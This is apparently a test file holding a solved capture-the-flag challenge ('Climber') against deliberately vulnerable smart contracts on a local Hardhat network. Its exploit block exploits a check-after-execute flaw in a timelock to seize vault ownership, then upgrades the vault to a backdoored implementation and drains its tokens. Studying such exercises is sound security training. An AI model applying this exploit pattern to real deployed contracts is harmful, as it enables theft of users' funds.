const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        
        /*
         * Exploit strategy:
         * The bug is caused by the reentrancy inside ClimberTimeLock::execute function
         * due to an array of calls to any contract with functionCallWithValue 
         * we can execute a series of events which make the following
         * (CimberTimeLock contract is also a self-admin so we can change roles)
         * 1. make ClimberExp (exploit contract) a PROPOSER
         * 2. call ClimberTimeLock::updateDelay to set delay 0
         * 3. call ClimberVault::transferOwnershop(attacker)
         * 4. schedule events for the three tasks above (see the trick in the comments below)
         * this should pass the check "require(getOperationState(id) == OperationState.ReadyForExecution)"
         * (this check should be placed before functionCallWithValue to prevent this bug.) 
         * 5. upgrade the ClientVaultBackdoor which is a copy of ClientVault with a backdoor function 
         * 6. withdrawn funds
         */
        
        let timelockABI = [
           "function updateDelay(uint64)",
           "function grantRole(bytes32,address)"
        ]
        let climberVaultABI = [
            "function transferOwnership(address)"
        ]
        let climberExpABI = [
            "function doSchedule(address[],uint256[],bytes[],bytes32)",
        ]
        
        const expFactory = await ethers.getContractFactory("ClimberExp");
        const climberExp = await expFactory.deploy();

        let targets = [this.timelock.address, this.timelock.address, this.vault.address, climberExp.address];
        let values = [0, 0, 0, 0];
        let timelockI = new ethers.utils.Interface(timelockABI);
        let climberVaultI = new ethers.utils.Interface(climberVaultABI);
        let climberExpI = new ethers.utils.Interface(climberExpABI);

        // gives ClimberTimeLock PROPOSER role
        let makeProposer = timelockI.encodeFunctionData("grantRole", [ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE")), climberExp.address]);
        // sets task delay to 0
        let zeroDelay = timelockI.encodeFunctionData("updateDelay", [0]);
        // transfers ownership of Climber Vault to attacker
        let transferOwner = climberVaultI.encodeFunctionData("transferOwnership", [attacker.address]);
        
        const salt = ethers.utils.hexZeroPad("0xAAAA", 32);

        /* 
         * scheduling this task array and setting delay to 0 should reusult with ReadyForExecution state
         * I came across a dangling refrence caused by schedule event and decided to call schedule outside of the task array.
         * But scheduling should execute before ReadyForExecution check in execute.
         * I couldn't think a way to avoid it other than calling another contract and make it schedule the defined tasks. 
         * The problem is that, I cannot precalculate operationId of a schedule task due to keccak256 used while calculating operationId,
         * which also includes the same task calling schedule. However there may be other ways to write this exploit.
         * I could have written the whole exploit as a contract. However it would require multiple functions for execute and schedule calls 
         * to solve this also. It would be basically the same solution with a different implementation.
         */
        let triggerSchedule = climberExpI.encodeFunctionData(
            "doSchedule",
            [
                targets,
                values,
                [makeProposer, zeroDelay, transferOwner],
                salt
            ]
        );
       
        // call the execute function with the prepared parameters
        let tx = await this.timelock.execute(
            targets,
            values,
            [makeProposer, zeroDelay, transferOwner, triggerSchedule],
            salt
        );
        await tx.wait();
        //console.log(tx);

        // attacker should be the owner of the vault at this point ;)
        expect(await this.vault.owner()).to.eq(attacker.address);
    
        // upgrade ClimberVault to ClimberVaultBackdoor and call backdoor function immediately 
        const vaultFactory = await ethers.getContractFactory('ClimberVaultBackdoor', attacker);
        const vaultNew = await vaultFactory.deploy();

        const upgradeABI = [
            "function backdoor(address)" 
        ]
        let upgradeI = new ethers.utils.Interface(upgradeABI);
        let upgradeCall = upgradeI.encodeFunctionData("backdoor", [this.token.address]);
        tx = await this.vault.connect(attacker).upgradeToAndCall(vaultNew.address, upgradeCall);
        await tx.wait();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
    